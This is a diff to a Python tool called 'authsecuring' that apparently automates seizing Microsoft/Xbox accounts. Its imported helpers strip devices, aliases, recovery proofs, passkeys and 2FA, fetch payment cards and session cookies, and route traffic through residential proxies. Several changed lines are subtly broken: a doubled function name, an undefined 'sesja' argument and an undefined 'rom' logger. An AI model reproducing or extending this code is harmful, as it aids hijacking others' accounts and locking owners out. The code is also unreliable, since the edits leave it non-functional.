@@ -8,7 +8,7 @@ from authsecuring.utils.security.remove_devices import purge_devices
 from authsecuring.utils.security.delete_aliases import wipe_foreign_aliases
 from authsecuring.utils.security.remove_proof import strip_proofs
 from authsecuring.utils.security.remove_fed_cred import wipe_fed_creds
-from authsecuring.utils.security.leave_family import leave_family_group
+from authsecuring.utils.security.leave_family import leave_family_group_group
 from authsecuring.utils.security.remove_zyger import strip_passkeys
 from authsecuring.utils.security.remove_2fa import drop_2fa
 from authsecuring.utils.security.recovery import recover
@@ -20,10 +20,10 @@ from authsecuring.utils.ogi.get_devices import fetch_devices
 from authsecuring.utils.ogi.get_family import fetch_family
 from authsecuring.utils.ogi.get_cards import fetch_cards
 
-from authsecuring.utils.cookies.get_cookies import get_cookies
-from authsecuring.utils.cookies.get_amrp import get_amrp
-from authsecuring.utils.cookies.get_amc import get_amc
-from authsecuring.utils.cookies.get_t import get_t
+from authsecuring.utils.cookies.get_cookies import fetch_canary
+from authsecuring.utils.cookies.get_amrp import fetch_amrp
+from authsecuring.utils.cookies.get_amc import fetch_amc_token
+from authsecuring.utils.cookies.get_t import fetch_t
 from authsecuring.utils.cookies.safe_cookies import iter_cookie_jar
 
 from authsecuring.utils.security.logout_all import kick_sessions
@@ -112,7 +112,7 @@ async def _xbl_client(session: httpx.AsyncClient) -> httpx.AsyncClient:
     sisu.xboxlive.com often dies through residential HTTP CONNECT, so Xbox
     hosts go direct.
     """
-    from authsecuring.utils.proxy import LiveXboxSplitTransport, microsoft_proxy_url
+    from authsecuring.utils.proxy import XboxSplitTransport, xbox_proxy_url
 
     headers = {
         "User-Agent": session.headers.get(
@@ -130,14 +130,14 @@ async def _xbl_client(session: httpx.AsyncClient) -> httpx.AsyncClient:
         "http2": False,
         "trust_env": False,
     }
-    proxy_url = microsoft_proxy_url(session)
+    proxy_url = xbox_proxy_url(session)
     if not proxy_url:
         print("[!] - No proxy configured — XBL client is fully direct")
         return httpx.AsyncClient(proxy=None, **kwargs)
 
     print("[~] - XBL SSO: Live/account.live.com via sticky proxy, Xbox CDN direct")
     return httpx.AsyncClient(
-        transport=LiveXboxSplitTransport(proxy_url),
+        transport=XboxSplitTransport(proxy_url),
         **kwargs,
     )
 
@@ -283,7 +283,7 @@ async def lock_account(
     try:
         msa_tokens = await fetch_amc_token(session)
     except Exception as exc:
-        from authsecuring.utils.proxy import format_exception_reason
+        from authsecuring.utils.proxy import proxy_error_reason
 
         err_detail = proxy_error_reason(exc)
         rom.exception("get_amc failed: %s", err_detail)
@@ -297,7 +297,7 @@ async def lock_account(
 
     t = None
     try:
-        t = await fetch_t(session)
+        t = await fetch_t(sesja)
         if t:
             await fetch_amrp(session, t)
             print(f"[+] - Got T / AMRP")
